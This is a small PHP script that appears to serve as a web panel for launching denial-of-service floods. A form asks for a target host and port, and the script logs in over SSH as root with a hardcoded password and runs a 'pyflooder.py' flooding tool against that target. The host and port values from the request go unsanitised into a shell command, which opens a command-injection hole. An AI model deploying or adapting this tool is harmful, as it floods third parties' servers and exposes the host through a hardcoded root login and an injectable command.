<?php

// Install SSH2 or else this will not work!

  if (isset($_REQUEST['host']) && isset($_REQUEST['requests']) && isset($_REQUEST['port']) ){

    $host = $_REQUEST['host'];
    $requests = $_REQUEST['requests'];
    $port = $_REQUEST['port'];

    $connection = ssh2_connect('localhost', 22);
    ssh2_auth_password($connection, 'root', 'Lolol123');

    $stream = ssh2_exec($connection, "screen -dmS -X python pyflooder.py http://{$host} {$port} 1000");

    }else{
      
    }

?>
<form method="POST" action="">
<input type="text" placeholder="google.com" name="host">
<input type="text" placeholder="80" name="port">
<input type="text" name="requests" placeholder="1000" value="1000">
<input type="submit">
</form>
